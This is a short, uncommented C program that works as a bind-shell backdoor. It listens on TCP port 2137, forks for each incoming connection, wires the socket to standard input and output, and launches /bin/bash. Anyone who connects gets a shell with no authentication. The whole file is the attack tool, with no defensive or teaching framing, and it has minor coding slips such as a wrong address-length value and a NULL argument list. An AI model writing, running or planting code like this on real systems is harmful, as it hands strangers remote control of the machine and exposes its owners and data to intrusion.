#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#define PORT 2137

int main(void)
{
    int server_fd,client_fd;
    size_t len=sizeof(client_fd);
    struct sockaddr_in server,client;
    server_fd=socket(AF_INET,SOCK_STREAM,0);
    server.sin_addr.s_addr = htons(INADDR_ANY);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    if(bind(server_fd,(struct sockaddr*)&server,(size_t)sizeof(server))!=0)
        return -1;
    listen(server_fd,0);
    while(1)
    {
        client_fd=accept(server_fd,(struct sockaddr*)&client,(socklen_t*)&len);
        if(client_fd>0)
            switch(fork())
            {
                case 0: 
                    dup2(client_fd,0);
                    dup2(client_fd,1);
                    dup2(client_fd,2);
                    execve("/bin/bash",NULL,NULL);
                    close(client_fd);
                    return 0;
                case -1:
                    return -1;
                default:
                    break;
            }
    }
    close(server_fd);
    return 0;
}
